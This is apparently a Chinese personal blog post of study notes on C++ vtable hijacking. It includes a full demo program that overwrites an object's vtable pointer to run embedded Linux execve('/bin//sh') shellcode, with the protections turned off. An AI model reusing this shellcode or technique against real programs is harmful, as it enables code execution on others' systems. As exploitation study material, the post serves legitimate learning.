---
title: pwning in c++
date: 2016-10-20 08:16:26
tags: 
- c++
- exploit
categories:
- misc_exploit
---

自从学了c++以来就几乎没有接触过了，除了在一年前看0day那本书时看过c++虚函数的攻击，但现在几乎不怎么记得了。
所以就记录一下pwning in c++吧。(不定时更新)

## virtual function table

关于[c++虚表](http://blog.csdn.net/haoel/article/details/1948051/):
1.实现多态。
1.虚表位于对象存储区域的开始处，所以可以很容易得到其地址。
2.只有使用对象指针或引用来调用虚函数时才会使用虚表调用的方式。
<!-- more -->
### analysis

下面写一段简单的代码来实现以下攻击虚表。

```c++
#include <iostream>
#include <unistd.h>
#include <string.h>

using namespace std;

char shellcode[] = "\x00\x00\x00\x00\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80";

class TestClass
{
public:
	char buf[40];
	virtual void test()
	{
		cout << "In TestClass::test()\n" << endl;
	}
};

TestClass overflow, *p;

int main()
{
	cout << "shellcode's address: " << &shellcode << endl;
	/*change as the correct shellcode's address*/
	shellcode[0] = 0x60;
	shellcode[1] = 0x9c;
	shellcode[2] = 0x04;
	shellcode[3] = 0x08;

	char *p_vtable;
	p_vtable = (char*)&overflow;  //point to virtual table
   
	p_vtable[0] = 0x5c;
	p_vtable[1] = 0x9c;
	p_vtable[2] = 0x04;
	p_vtable[3] = 0x08;

	p = &overflow;
	p->test();

	return 0;
}
```
在程序中我们把虚表的位置改为0x8049c5c，即全局变量shellcode的地址，然后把虚表里面存储的第一个地址改为变量shellcode后四个字节处，即真正的shellcode的位置，这样当p->test()时，并不是执行test()函数，而是执行shellcode。
执行效果如下：
<img src="http://of38fq57s.bkt.clouddn.com/vtable.PNG">
by default, DEP, ALSR, and stack protector are closed.

### conclusion

c++虚表主要用来hijacking，但实际不可能像我举得例子这么简单，一般会结合栈溢出，堆溢出等漏洞。感觉还是挺有用的。
